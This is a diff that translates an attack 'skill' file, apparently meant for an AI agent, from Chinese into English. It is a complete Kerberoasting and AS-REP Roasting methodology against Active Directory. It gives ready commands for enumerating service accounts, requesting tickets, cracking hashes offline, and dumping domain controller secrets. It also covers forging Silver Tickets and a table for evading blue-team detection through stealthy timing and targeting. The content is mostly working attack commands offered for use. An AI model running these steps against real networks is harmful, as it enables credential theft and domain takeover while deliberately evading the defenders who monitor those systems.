@@ -1,122 +1,123 @@
 ---
 name: kerberoast-attack
-description: "Kerberoasting 与 AS-REP Roasting 完整攻击方法论。当拥有任意域用户凭据（Kerberoasting）或发现无需预认证的账户（AS-REP Roasting）时使用。覆盖 SPN 发现、票据请求、离线破解、AES vs RC4 策略选择"
+description: "Complete Kerberoasting and AS-REP Roasting attack methodology. Use when you hold any domain user credentials (Kerberoasting) or discover accounts without pre-authentication (AS-REP Roasting). Covers SPN discovery, ticket requests, offline cracking, and AES vs RC4 strategy selection"
+zh-signals: "Kerberoasting 与 AS-REP Roasting 域内票据攻击与离线破解方法。信号:Kerberoasting,AS-REP,Kerberos,域攻击,离线破解"
+when-to-use: "Use when you hold any domain user credentials or find accounts without pre-authentication and need to extract and crack service tickets."
 metadata:
-  tags: "kerberoast,asrep,kerberos,spn,tgs,hashcat,域攻击,票据,服务账户,离线破解"
+  tags: "kerberoast,asrep,kerberos,spn,tgs,hashcat,domain-attack,ticket,service-account,offline-cracking"
   category: "lateral"
   mitre_attack: "T1558.003,T1558.004"
 ---
 
 # Kerberoasting & AS-REP Roasting
 
-> **核心价值**：以任意域用户权限获取高权限服务账户密码 → 无需提权即可达到域管级别
+> **Core Value**: Obtain high-privilege service account passwords with any domain user privilege → reach domain admin level without privilege escalation
 
-## ⛔ 深入参考
+## ⛔ Further Reading
 
-- Hashcat 破解模式与字典策略 → [references/hash-cracking.md](references/hash-cracking.md)
-- 多 Hash 类型 GPU 基准与高级破解工程 → [references/hash-cracking-guide.md](references/hash-cracking-guide.md)
-- 防御绕过与高级利用 → [references/advanced-kerberoast.md](references/advanced-kerberoast.md)
+- Hashcat cracking modes and wordlist strategies → [references/hash-cracking.md](references/hash-cracking.md)
+- GPU benchmarks for multiple hash types and advanced cracking engineering → [references/hash-cracking-guide.md](references/hash-cracking-guide.md)
+- Defense evasion and advanced exploitation → [references/advanced-kerberoast.md](references/advanced-kerberoast.md)
 
 ---
 
-## Part A: Kerberoasting（需要任意域用户凭据）
+## Part A: Kerberoasting (requires any domain user credentials)
 
-### Phase 1: SPN 枚举
+### Phase 1: SPN Enumeration
 
 ```bash
-# impacket — 最推荐
+# impacket — most recommended
 impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request
 
 # netexec
 netexec ldap DC_IP -u user -p pass --kerberoasting output.txt
 
-# 纯 LDAP 查询
+# Pure LDAP query
 ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
   -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" \
   sAMAccountName servicePrincipalName memberOf
 
-# PowerShell（已在域内机器）
+# PowerShell (on a machine already in the domain)
 setspn -T domain -Q */*
-# 或
+# or
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
-### Phase 2: 票据请求策略
+### Phase 2: Ticket Request Strategy
 
 ```
-加密类型选择：
-├─ RC4 (etype 23) → hashcat mode 13100 → 破解速度快 ⭐
-├─ AES256 (etype 18) → hashcat mode 19700 → 破解速度慢 10x
-└─ AES128 (etype 17) → hashcat mode 19600 → 中等
+Encryption type selection:
+├─ RC4 (etype 23) → hashcat mode 13100 → fast cracking ⭐
+├─ AES256 (etype 18) → hashcat mode 19700 → 10x slower cracking
+└─ AES128 (etype 17) → hashcat mode 19600 → moderate
 
-策略：
-├─ 默认 impacket 请求 RC4 → 最快破解
-├─ 如果目标强制 AES → 只能接受慢速破解
-├─ ⛔ 域控可能监控 RC4 TGS 请求 → OPSEC 风险！
-└─ AES 请求更隐蔽（正常行为），但破解慢
+Strategy:
+├─ impacket requests RC4 by default → fastest cracking
+├─ If the target enforces AES → slow cracking is the only option
+├─ ⛔ The domain controller may monitor RC4 TGS requests → OPSEC risk!
+└─ AES requests are stealthier (normal behavior) but crack slower
 ```
 
-**OPSEC 考虑：**
+**OPSEC considerations:**
 ```
-# 隐蔽方式：请求 AES 加密票据（看起来更正常）
+# Stealthy approach: request AES-encrypted tickets (looks more normal)
 impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile hashes.txt
 
-# 超隐蔽：只请求特定高价值 SPN（不枚举全部）
+# Ultra-stealthy: only request specific high-value SPNs (do not enumerate all)
 impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
   -request -target-user svc_sql_admin
 
-# ⛔ 避免：一次性请求所有 SPN 的票据 → 告警
+# ⛔ Avoid: requesting tickets for all SPNs at once → alerts
 ```
 
-### Phase 3: 离线破解
+### Phase 3: Offline Cracking
 
 ```bash
-# Hashcat — GPU 破解
+# Hashcat — GPU cracking
 hashcat -m 13100 hashes.txt wordlist.txt           # RC4
 hashcat -m 19700 hashes.txt wordlist.txt           # AES256
-hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule  # 规则
+hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule  # rules
 
 # John the Ripper
 john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
 
-# 字典选择优先级
-├─ 1. 目标相关字典（公司名+年份+特殊字符）
-├─ 2. rockyou.txt + 规则
-├─ 3. 泄露密码库
-└─ 4. 组合攻击（公司名 + 常见模式）
+# Wordlist selection priority
+├─ 1. Target-specific wordlists (company name + year + special characters)
+├─ 2. rockyou.txt + rules
+├─ 3. Leaked password collections
+└─ 4. Combination attacks (company name + common patterns)
 ```
 
-### Phase 4: 高价值目标识别
+### Phase 4: High-Value Target Identification
 
 ```
-并非所有 SPN 账户都值得破解，优先级：
+Not every SPN account is worth cracking, priority:
+High value (crack first):
+├─ The account is a member of Domain Admins / Enterprise Admins
+├─ The account name contains "admin" / "svc" / "sql" / "backup"
+├─ The account has the AdminCount=1 attribute
+├─ The account appears on BloodHound attack paths
+└─ The account has a lax password policy (no enforced complexity)
 
-高价值（优先破解）：
-├─ 账户是 Domain Admins / Enterprise Admins 成员
-├─ 账户名含 "admin" / "svc" / "sql" / "backup"
-├─ 账户有 AdminCount=1 属性
-├─ 账户在 BloodHound 攻击路径上
-└─ 账户密码策略宽松（无强制复杂度）
-
-判断方法：
+Identification method:
 ldapsearch ... "(&(servicePrincipalName=*)(adminCount=1))" sAMAccountName
 ```
 
 ---
 
-## Part B: AS-REP Roasting（无需凭据/需要用户列表）
+## Part B: AS-REP Roasting (no credentials required / user list needed)
 
-### Phase 1: 发现无需预认证的用户
+### Phase 1: Discover Accounts Without Pre-authentication
 
 ```bash
-# 无需凭据 — 枚举无需预认证的用户
+# No credentials — enumerate accounts without pre-authentication
 impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt \
   -format hashcat -outputfile asrep_hashes.txt
 
-# 有凭据 — 查询所有无需预认证的用户
+# With credentials — query all accounts without pre-authentication
 impacket-GetNPUsers DOMAIN/user:pass -dc-ip DC_IP -request
 
-# LDAP 查询
+# LDAP query
 ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
   -b "DC=domain,DC=com" \
   "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
@@ -126,7 +127,7 @@ ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
 netexec ldap DC_IP -u user -p pass --asreproast asrep.txt
 ```
 
-### Phase 2: 破解 AS-REP 哈希
+### Phase 2: Crack AS-REP Hashes
 
 ```bash
 # hashcat mode 18200
@@ -138,37 +139,37 @@ john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt
 
 ---
 
-## Part C: 后利用 — 破解成功后
+## Part C: Post-Exploitation — After a Successful Crack
 
 ```
-拿到服务账户密码后：
-├─ 使用凭据横向移动
+Once you have a service account password:
+├─ Use the credentials for lateral movement
 │   netexec smb TARGETS -u svc_account -p 'cracked_pass'
-├─ 如果是 DA/高权限
+├─ If it is a DA / high-privilege account
 │   impacket-secretsdump DOMAIN/svc_admin:pass@DC_IP
-├─ 申请 Silver Ticket（不经过 DC 验证）
+├─ Request a Silver Ticket (no DC verification)
 │   impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain DOMAIN -spn ...
-└─ 添加 SPN 到已控账户 → Targeted Kerberoasting
-    setspn -a http/fake svc_account  # 让其他人可以对你 Kerberoast
+└─ Add an SPN to a compromised account → targeted Kerberoasting
+    setspn -a http/fake svc_account  # let others Kerberoast you
 ```
 
-## 检测与规避对照
+## Detection and Evasion Matrix
 
-| 蓝队检测 | 红队对策 |
+| Blue Team Detection | Red Team Countermeasure |
 |----------|---------|
-| 大量 TGS 请求 (EventID 4769) | 只请求高价值目标，不全量枚举 |
-| RC4 降级检测 | 请求 AES256 票据（破解慢但隐蔽） |
-| 蜜罐 SPN 账户 | 对比 BloodHound 数据，排除异常 SPN |
-| 异常时间请求 | 业务时间操作 |
-| 特定账户大量票据 | 分散请求时间 |
+| Mass TGS requests (EventID 4769) | Only request high-value targets, do not enumerate everything |
+| RC4 downgrade detection | Request AES256 tickets (slower cracking but stealthier) |
+| Honeypot SPN accounts | Compare against BloodHound data and exclude anomalous SPNs |
+| Anomalous timing of requests | Perform the operations during business hours |
+| Large number of tickets for a specific account | Spread the request timing |
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| impacket-GetUserSPNs | Kerberoasting 票据请求 |
+| impacket-GetUserSPNs | Kerberoasting ticket requests |
 | impacket-GetNPUsers | AS-REP Roasting |
-| netexec | 集成枚举与攻击 |
-| Rubeus | Windows 端 Kerberoasting（含 OPSEC 选项） |
-| hashcat | GPU 离线破解 |
-| BloodHound | 识别高价值 SPN 账户 |
+| netexec | Integrated enumeration and attack |
+| Rubeus | Windows-side Kerberoasting (including OPSEC options) |
+| hashcat | GPU offline cracking |
+| BloodHound | Identify high-value SPN accounts |
